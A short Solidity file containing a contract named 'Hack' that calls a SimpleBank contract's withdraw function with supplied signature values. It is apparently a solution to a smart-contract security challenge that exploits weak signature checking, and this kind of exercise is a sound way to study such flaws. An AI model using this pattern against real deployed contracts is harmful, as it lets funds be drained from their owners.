pragma solidity ^0.8.13;

// import "@openzeppelin/contracts/utils/cryptography/SignatureChecker.sol";
import "interfaces/ISimpleBank.sol";

contract Hack {
    address private immutable owner;
    ISimpleBank public immutable BANK;

    constructor(address bank) {
        BANK = ISimpleBank(bank);
        owner = msg.sender;
    }

    function hack(bytes32 msgHash, uint8 v, bytes32 r, bytes32 s) external payable {
        require(msg.sender == owner, "!Owner");
        // just to be safe we have so much money why not waste it right ?
        require(msg.value >= 10 ether, "! Enough Funds");
        
        // require(isValidSignatureNow(owner, msgHash, _signature), "Invalid Signautre");

        BANK.withdraw(msgHash, v, r, s);
    }
}
